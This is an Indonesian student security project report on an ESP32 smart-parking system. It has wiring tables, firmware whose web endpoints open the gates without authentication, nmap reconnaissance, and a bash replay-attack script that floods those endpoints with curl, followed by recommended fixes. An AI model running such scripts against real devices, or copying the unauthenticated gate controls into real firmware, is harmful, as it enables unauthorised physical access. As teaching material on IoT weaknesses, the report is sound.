## UAS Keamanan Komputer
## Kelas TK5B
## Nama Kelompok
- Antony Subroto ---------------------(090302823270)
- Y. Agatha Natsua -----------------(09030282327052)
- Dyakiyyah Aulia Nadzifah BR.S --- (09030582327100)

# Smart Prakir
## _Menggunakan arduino, 2 sensor infrared, 2 servo, lcd 12C 16 x 2 sebagai display jumlah slot parkir yang tersisa._

## Fitur utama

- Palang masuk terbuka, jika kendaraan terdeteksi oleh sensor infrared
- Palang keluar terbuka, jika kendaraan terdeteksi oleh sensor infrared
- jika inf terdeteksi maka buttom akan di tekan dan palang akan terbuka
- Tampilan pada LCD 12IC 16 x 2
  - Pesan selamat datang
  - Slot prakir berkurang saat kendaraan masuk 
  - Slot prakir nambah saat kendaraan keluar
  - Notifikasi "parkir full" jika slot habis
 
---
## Komponen yang digunakan
| No | Komponen | Jumlah |
|----|----------|--------|
| 1 | Arduino Uno / Nano | 1 |
| 2 | Sensor IR Infrared | 4 |
| 3 | Servo SG90 | 2 |
| 4 | LCD I2C 16x2 | 2 |
| 5 | Kabel jumper | - |
| 6 | Power 5V | 1 |
| 7 | Esp 32 | 1 |
| 8 | Buttom | 2 |
| 9 | Breadboard | 1 |

---

## Wiring Diagram
### *LCD 12C 16 x 2*
| LCD I2C | Arduino |
|---------|---------|
| VCC     | 5V      |
| GND     | GND     |
| SDA     | A4      |
| SCL     | A5      |

### Tabel Tampilan LCD (Smart Parking)
| Kondisi Sistem                     | Teks pada LCD                          |
|------------------------------------|-----------------------------------------|
| Sistem menyala                     | Smart Parking / Slot: X                |
| IR1 terdeteksi (proses masuk)      | Selamat Datang / Tekan Tombol          |
| Slot penuh                         | Parkir Penuh!                           |
| Tombol masuk tidak ditekan         | Coba Lagi                               |
| Gerbang masuk terbuka              | Silahkan Masuk                          |
| Mobil berhasil masuk               | Terima Kasih ^-^                        |
| IR3 terdeteksi (proses keluar)     | Tekan Tombol / Untuk Keluar             |
| Tombol keluar tidak ditekan        | Coba Lagi                               |
| Gerbang keluar terbuka             | Silahkan Keluar                         |
| Mobil berhasil keluar              | Terima Kasih ^-^                        |
| Tampilan utama                     | Slot Sisa: X / Total: 50                |
---
### *Sensor Infrared*

| Sensor      | ESP32 Pin |
|-------------|-----------|
| IR MASUK 1  | 32        |
| IR MASUK 2  | 33        |
| IR KELUAR 1 | 25        |
| IR KELUAR 2 | 26        |
---
### *Tombol*

| Tombol          | ESP32 Pin |
|------------------|-----------|
| Tombol MASUK     | 27        |
| Tombol KELUAR    | 14        |
---
### *Servo*

| Servo         | ESP32 Pin |
|---------------|-----------|
| Servo MASUK   | 13        |
| Servo KELUAR  | 15        |
---
### *Buzzer*

| Komponen | ESP32 Pin |
|----------|-----------|
| Buzzer   | 12        |
---


---

## Cara kerja program
1. LCD menyala dan menampilkan intro "selamat datang".
2. Jika mobil masuk melewati sensor awal yaitu sensor masuk, maka sensor mendeteksi, dan lcd akan menampilkan bahwa slot parkir berkurang
3. Buttom di tekan guna untuk  mengkonfirmasi ketika ada objek terdeteksi oleh sensor infrared
4. lcd akan selalu menampilkan sisa slot yang tersedia,
   - jika slot 0 lcd akan menampilkan *parkir full*
   - palang masuk tidak terbuka
---


---
#### Replay attack pada smart parking system ESP32
1. Cara Kerja
Pada smart parking berbasis esp32, penyerangan merekam paket dari sensor infrared yang menunjukan "slot terisi". paket itu kemudian diputar ulang ketika slot sebenarnya kosong. Server tidak bisa membedakan paket lama dan paket baru sehingga status slot berubah menajdi terisi meski tidak ada kendaraan yang lewat.
2. Dampak serangan pada sistem
Replay attack menyebabkan data status parkir menjadi tidak akurat. Slot yang seharusnya kosong terbaca penuh, sehingga pengguna tidak dapat memanfaatkan slot yang tersedia. Jika serangan dilakukan berulang, sistem bisa menampilkan seluruh area sebagai penuh, mengganggu operasional dan menurunkan keandalan sistem smart parking.
3. Penyebab sistem replay attack
Kerentanan terjadi karena sistem tidak memiliki mekanisme untuk membedakan pesan asli dan salinan. Tanpa enkripsi, timestamp, atau token unik, ESP32 menerima semua paket yang formatnya benar. Hal ini membuat penyerang cukup memutar ulang paket lama untuk menipu perangkat




## Berikut code program
#include <WiFi.h>
#include <WebServer.h>
#include <Wire.h>
#include <LiquidCrystal_I2C.h>
#include <ESP32Servo.h>
// ---------- Config ----------
const char* apSSID = "ESP32-Parking";
const char* apPassword = "park12345"; // minimal 8 chars
// I2C LCD address - ganti kalau perlu setelah running I2C scanner
LiquidCrystal_I2C lcd(0x27, 16, 2);
// ---------- Pins (tidak diubah) ----------
#define IR1 32
#define IR2 33
#define IR3 25
#define IR4 26
#define BUTTON1 27
#define BUTTON2 14
#define BUZZER 12
#define SERVO1_PIN 13
#define SERVO2_PIN 15
// ---------- Servo ----------
Servo servo1;
Servo servo2;
const int SERVO_OPEN_ANGLE = 90;
const int SERVO_CLOSE_ANGLE = 0;
// ---------- Parking state ----------
const int slotTotal = 50;
volatile int slotSisa = 5;
// waiting flags and timers
bool waitMasuk = false;
unsigned long waitMasukStart = 0;
bool waitKeluar = false;
unsigned long waitKeluarStart = 0;
const unsigned long WAIT_TIMEOUT = 7000UL; // 7 detik untuk validasi lewat IR2/IR4
const unsigned long BUTTON_WAIT = 5000UL;  // maksimal menunggu konfirmasi (web/button) setelah IR detect
// debounce
unsigned long lastBtn1 = 0;
unsigned long lastBtn2 = 0;
const unsigned long DEBOUNCE_MS = 50;
// web server
WebServer server(80);
// mutex-like simple lock for actions
volatile bool actionInProgress = false;
// ---------- Helpers ----------
void beep(int freq = 1500, int dur = 200) {
 // tone should work on ESP32 core; if not available, replace with ledc PWM
 tone(BUZZER, freq, dur);
}
void updateLCDStatus() {
 lcd.clear();
 lcd.print("Slot: ");
 lcd.print(slotSisa);
 lcd.setCursor(0,1);
 lcd.print("Max:");
 lcd.print(slotTotal);
}
void openServo1() {
 servo1.write(SERVO_OPEN_ANGLE);
}
void closeServo1() {
 servo1.write(SERVO_CLOSE_ANGLE);
}
void openServo2() {
 servo2.write(SERVO_OPEN_ANGLE);
}
void closeServo2() {
 servo2.write(SERVO_CLOSE_ANGLE);
}
// ---------- Web UI ----------
String webpageHTML() {
 String s = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
 s += "<title>Smart Parking</title></head><body>";
 s += "<h2>Smart Parking ESP32</h2>";
 s += "<p><b>Slot Tersisa:</b> <span id='slot'>--</span> / " + String(slotTotal) + "</p>";
 s += "<p><b>Status Masuk:</b> <span id='sMasuk'>--</span></p>";
 s += "<p><b>Status Keluar:</b> <span id='sKeluar'>--</span></p>";
 s += "<button onclick='confirmMasuk()'>Konfirmasi Masuk</button>";
 s += "<button onclick='confirmKeluar()'>Konfirmasi Keluar</button>";
 s += "<p id='msg'></p>";
 // Javascript
 s += "<script>";
 s += "function refresh(){";
 s += " fetch('/status').then(r=>r.json()).then(j=>{";
 s += " document.getElementById('slot').innerText=j.slot;";
 s += " document.getElementById('sMasuk').innerText = j.waitMasuk ? 'Menunggu Konfirmasi' : 'Idle';";
 s += " document.getElementById('sKeluar').innerText = j.waitKeluar ? 'Menunggu Konfirmasi' : 'Idle';";
 s += " });";
 s += "}";
 s += "setInterval(refresh, 1000); refresh();";
 s += "function confirmMasuk(){";
 s += " fetch('/confirm_masuk').then(r=>r.text()).then(t=>{document.getElementById('msg').innerText=t;});";
 s += "}";
 s += "function confirmKeluar(){";
 s += " fetch('/confirm_keluar').then(r=>r.text()).then(t=>{document.getElementById('msg').innerText=t;});";
 s += "}";
 s += "</script>";
 s += "</body></html>";
 return s;
}
void handleRoot() {
 server.send(200, "text/html", webpageHTML());
}
String handleConfirmMasuk() {
 // Called from web button
 if (!waitMasuk) return "Tidak ada kendaraan menunggu konfirmasi (masuk).";
 if (slotSisa <= 0) return "Maaf, parkir penuh.";
 if (actionInProgress) return "Sedang memproses, tunggu.";
 actionInProgress = true;
 // Accept confirmation -> open gate, wait for IR2
 openServo1();
 unsigned long start = millis();
 // Wait up to WAIT_TIMEOUT for IR2
 while (millis() - start < WAIT_TIMEOUT) {
   if (digitalRead(IR2) == LOW) {
     // success
     slotSisa = max(0, slotSisa - 1);
     beep(1500,200);
     closeServo1();
     waitMasuk = false;
     actionInProgress = false;
     updateLCDStatus();
     return "Masuk dikonfirmasi. Gate ditutup. Slot dikurangi.";
   }
   delay(50);
 }
 // timeout
 closeServo1();
 waitMasuk = false;
 actionInProgress = false;
 updateLCDStatus();
 return "Timeout: kendaraan tidak melewati sensor validasi (IR2).";
}
String handleConfirmKeluar() {
 if (!waitKeluar) return "Tidak ada kendaraan menunggu konfirmasi (keluar).";
 if (actionInProgress) return "Sedang memproses, tunggu.";
 actionInProgress = true;
 openServo2();
 unsigned long start = millis();
 while (millis() - start < WAIT_TIMEOUT) {
   if (digitalRead(IR4) == LOW) {
     // success
     slotSisa = min(slotTotal, slotSisa + 1);
     beep(2000,300);
     closeServo2();
     waitKeluar = false;
     actionInProgress = false;
     updateLCDStatus();
     return "Keluar dikonfirmasi. Gate ditutup. Slot ditambah.";
   }
   delay(50);
 }
 closeServo2();
 waitKeluar = false;
 actionInProgress = false;
 updateLCDStatus();
 return "Timeout: kendaraan tidak melewati sensor validasi (IR4).";
}
void handleConfirmMasukEndpoint() {
 String res = handleConfirmMasuk();
 server.send(200, "text/plain", res);
}
void handleConfirmKeluarEndpoint() {
 String res = handleConfirmKeluar();
 server.send(200, "text/plain", res);
}
void handleStatus() {
 String json = "{";
 json += "\"slot\":" + String(slotSisa) + ",";
 json += "\"waitMasuk\":" + String(waitMasuk ? "true":"false") + ",";
 json += "\"waitKeluar\":" + String(waitKeluar ? "true":"false");
 json += "}";
 server.send(200, "application/json", json);
}
// ---------- Setup & Loop ----------
void setup() {
 Serial.begin(115200);
 delay(10);
 // I2C for LCD
 Wire.begin(21, 22);
 lcd.init();
 lcd.backlight();
 updateLCDStatus();
 // pins
 pinMode(IR1, INPUT);
 pinMode(IR2, INPUT);
 pinMode(IR3, INPUT);
 pinMode(IR4, INPUT);
 pinMode(BUTTON1, INPUT_PULLUP);
 pinMode(BUTTON2, INPUT_PULLUP);
 pinMode(BUZZER, OUTPUT);
 digitalWrite(BUZZER, LOW);
 // attach servos (with safe pulses for ESP32)
 servo1.attach(SERVO1_PIN, 500, 2400);
 servo2.attach(SERVO2_PIN, 500, 2400);
 closeServo1();
 closeServo2();
 // start AP
 WiFi.softAP(apSSID, apPassword);
 IPAddress IP = WiFi.softAPIP();
 Serial.print("AP IP address: ");
 Serial.println(IP);
 // web handlers
 server.on("/", handleRoot);
 server.on("/confirm_masuk", handleConfirmMasukEndpoint);
 server.on("/confirm_keluar", handleConfirmKeluarEndpoint);
 server.on("/status", handleStatus);
 server.begin();
 Serial.println("Web server started.");
}
unsigned long lastPoll = 0;
void loop() {
 server.handleClient();
 unsigned long now = millis();
 // poll sensors at 50ms intervals
 if (now - lastPoll >= 50) {
   lastPoll = now;
   // --- IR1: masuk detect ---
   if (digitalRead(IR1) == LOW && !waitMasuk && !actionInProgress) {
     // if slot empty => reject immediately
     if (slotSisa <= 0) {
       lcd.clear(); lcd.print("Maaf Parkir Penuh");
       beep(2000,200);
       delay(800);
       updateLCDStatus();
     } else {
       waitMasuk = true;
       waitMasukStart = now;
       lcd.clear(); lcd.print("Menunggu Konf Masuk");
       Serial.println("IR1 detected -> waiting for confirm (web/button).");
     }
   }
   // --- if waiting for masuk, check timeout or button press ---
   if (waitMasuk) {
     // physical button press (debounced)
     if (digitalRead(BUTTON1) == LOW && (now - lastBtn1 > DEBOUNCE_MS)) {
       lastBtn1 = now;
       Serial.println("Button1 pressed -> treat as confirm masuk (physical).");
       String r = handleConfirmMasuk();
       Serial.println(r);
     } else if (now - waitMasukStart > BUTTON_WAIT) {
       // no confirmation -> cancel
       waitMasuk = false;
       lcd.clear(); lcd.print("Masuk Batal");
       Serial.println("Masuk cancelled: no confirmation.");
       delay(600);
       updateLCDStatus();
     }
   }
   // --- IR3: keluar detect ---
   if (digitalRead(IR3) == LOW && !waitKeluar && !actionInProgress) {
     waitKeluar = true;
     waitKeluarStart = now;
     lcd.clear(); lcd.print("Menunggu Konf Keluar");
     Serial.println("IR3 detected -> waiting for confirm (web/button).");
   }
   // --- if waiting for keluar, check timeout or button press ---
   if (waitKeluar) {
     if (digitalRead(BUTTON2) == LOW && (now - lastBtn2 > DEBOUNCE_MS)) {
       lastBtn2 = now;
       Serial.println("Button2 pressed -> treat as confirm keluar (physical).");
       String r = handleConfirmKeluar();
       Serial.println(r);
     } else if (now - waitKeluarStart > BUTTON_WAIT) {
       waitKeluar = false;
       lcd.clear(); lcd.print("Keluar Batal");
       Serial.println("Keluar cancelled: no confirmation.");
       delay(600);
       updateLCDStatus();
     }
   }
 } // end poll
 // small idle
 delay(1);
}
METEDEOLOGI
	Proses ekkspoloitasi atau Penetation dilakukan secara sederhana, yaitu dengan


Reconnaissance dan Enumeration
Memindai Jaringan Lokal dan Port pada target yang aktif

Gambar 1.1 List Port ESP32 menggunakan nmap -T4 -F

Gambar 1.2 List Port ESP32 menggunakan nmap -sV -p

	Selanjutnya, pemindaian Nmap dengan perintah nmap -T4 -F 192.168.4.1 mengkonfirmasi bahwa Port 80 (HTTP) berstatus Open. Mengakses IP tersebut melalui browser menampilkan antarmuka "Smart Parking ESP32".

Authentication Bypass
	Ketika web server dapat diakses tanpa login, maka pada kali linux dapat menjalankan perintah “curl http://192.168.4.1”, Lalu didapat output:

Gambar 2.1 Kelemahan terdeteksi pada output curl

Gambar 2.2 Kelemahan terdeteksi pada output curl
	Hasil HTTP menunjukkan bahwa alamat Web Server menerima perintah (contoh:/confirm_keluar dan confirm_masuk) tanpa memeriksa siapa pengirimnya atau meminta kata sandi. sehingga sangat mudah untuk melakukan eksploitasi

Eksekusi Serangan
	Eksekusi menggunakan metode serangan Replay Attack dengan memanfaatkan Curl,

Gambar 3.1 Membuat file replay_attack.sh


Gambar 3.2 Isi file


	Gambar 3.3 Isi file 

kode: 
#!/bin/bash

# Replay Attack Script untuk ESP32 Smart Parking
# UNTUK TESTING SISTEM SENDIRI SAJA!

TARGET="192.168.4.1"
ENDPOINT_MASUK="/confirm_masuk"
ENDPOINT_KELUAR="/confirm_keluar"

echo "==================================="
echo "  ESP32 Parking Replay Attack Demo"
echo "==================================="
echo "Target: $TARGET"
echo ""

# Test 1: Single Replay
echo "[*] Test 1: Single request replay"
curl -s "http://$TARGET$ENDPOINT_MASUK"
echo ""
sleep 2

# Test 2: Rapid Replay (DoS-like)
echo "[*] Test 2: Rapid replay (10 requests dalam 1 detik)"
for i in {1..10}; do
    curl -s "http://$TARGET$ENDPOINT_MASUK" &
done
wait
echo ""
sleep 2

# Test 3: Alternating Replay
echo "[*] Test 3: Alternating masuk/keluar"
for i in {1..5}; do
    echo "  [>] Request $i: Masuk"
    curl -s "http://$TARGET$ENDPOINT_MASUK"
    sleep 1
    echo "  [<] Request $i: Keluar"
    curl -s "http://$TARGET$ENDPOINT_KELUAR"
    sleep 1
done
echo ""

# Test 4: Concurrent Replay
echo "[*] Test 4: Concurrent requests (race condition)"
curl -s "http://$TARGET$ENDPOINT_MASUK" &
curl -s "http://$TARGET$ENDPOINT_MASUK" &
curl -s "http://$TARGET$ENDPOINT_KELUAR" &
wait
echo ""

# Test 5: Status Monitoring
echo "[*] Test 5: Check system status"
curl -s "http://$TARGET/status" | python3 -m json.tool
echo ""

echo "==================================="
echo "  Replay Attack Demo Selesai"
echo "==================================="

	Setelah file berhasil dibuat, maka selanjutnya adalah menjalankan perintah “chmod x+ replay_attackk.sh” dan “./replay_attack.sh”
	![alt text]( )
Gambar 3.4 Sebelum Replay Attack


		Gambar 3.5 Sebelum Replay Attack

		Pada Gambar 3.5 terlihat jelas bahwa gerbang yang harusnya terbuka jika divalidasi lewat button atau dikonfirmasi lewat web server, bisa terbuka dengan menggunakan replay attack
KESIMPULAN
Sistem Smart Parking berbasis ESP32 yang dirancang pada proyek ini mampu mengotomatisasi proses masuk dan keluar kendaraan dengan menggunakan sensor infrared, servo, LCD I2C, tombol, dan web server sebagai antarmuka kontrol. Sistem dapat menampilkan jumlah slot secara real-time, mengatur palang otomatis, dan memberikan notifikasi saat kondisi penuh. Namun, hasil pengujian keamanan menunjukkan bahwa sistem masih memiliki kerentanan serius, terutama pada Web Server ESP32 yang tidak dilengkapi autentikasi. Melalui eksploitasi sederhana menggunakan curl, penyerang dapat melakukan authentication bypass dan replay attack, sehingga dapat membuka palang tanpa konfirmasi dan memanipulasi jumlah slot parkir. Serangan ini dapat mengganggu operasional karena status slot menjadi tidak akurat dan palang dapat terbuka tanpa kendaraan yang sah. Temuan ini menegaskan bahwa sistem membutuhkan peningkatan keamanan, seperti penambahan autentikasi, enkripsi, serta penggunaan token atau timestamp untuk mencegah pemutaran ulang paket.
SARAN
	Untuk meningkatkan keamanan dan keandalan sistem Smart Parking berbasis ESP32, diperlukan penerapan mekanisme autentikasi pada web server sehingga setiap perintah seperti confirm_masuk dan confirm_keluar hanya dapat dijalankan oleh pengguna yang berwenang. Sistem juga perlu ditambahkan enkripsi, timestamp, atau token unik pada setiap request agar replay attack tidak dapat dilakukan dengan mudah. Selain itu, pengembang disarankan untuk menerapkan validasi berlapis antara sensor, tombol, dan web server sehingga palang tidak dapat terbuka hanya dengan satu sumber perintah. Penggunaan HTTPS lokal atau protokol aman lainnya juga dapat membantu mencegah manipulasi data. Dari sisi perangkat, penambahan log aktivitas dan fitur monitoring dapat memberikan deteksi dini bila terjadi aktivitas mencurigakan. Dengan perbaikan tersebut, sistem Smart Parking dapat menjadi lebih aman, stabil, dan sulit dieksploitasi.



